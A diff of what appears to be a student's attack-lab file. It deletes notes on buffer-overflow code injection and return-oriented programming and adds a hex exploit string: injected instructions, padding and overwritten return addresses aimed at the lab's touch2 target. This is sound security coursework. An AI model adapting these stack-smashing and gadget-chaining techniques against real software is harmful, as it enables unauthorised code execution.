@@ -1,34 +1,7 @@
-Check getbuf in ctarget.s. See how much is being subtracted from the stack
-input that amount as a buffer into the input (0's). Then write actual code.
-
-insert address of touch 2
-mov touch to rdi register. place what is in cookie to rdi register.
-mov $0x234524, rdi
-ret
-save those instructions to txt file and then objdump txt file to get hex instructions
-./hex2raw <anph2.txt > a2.dat
-od -x a2.dat
-instead of code that directly moves cookie to pointer, we could pop the stack, like pop rdi
-
-phase_3
-give address of char[] pointer instead of actual string
-
-phase_4 return oriented programming
-stack is randomized and non executable
-use table of assembly byte representation
-so instead of mov cookie, rdi -> we use
-mov cookie, eax
-mov eax, rdi
-.
-instead of returning 401558, we can return 401559, which in objdump, is one hex value further
-find way to get cookie in to play, then find way to get you to where you want it
-pop rsi
-ret add gadget1
-pop value
-ret add
-
-construct the string top down based on your objective
-
-solution.txt
-c treats string as address that points to something
-use how c represents strings to your advantage
+48 c7 c7 15 0d bb 5e c3
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+28 d9 60 55 00 00 00 00
+fc 14 40 00 00 00 00 00
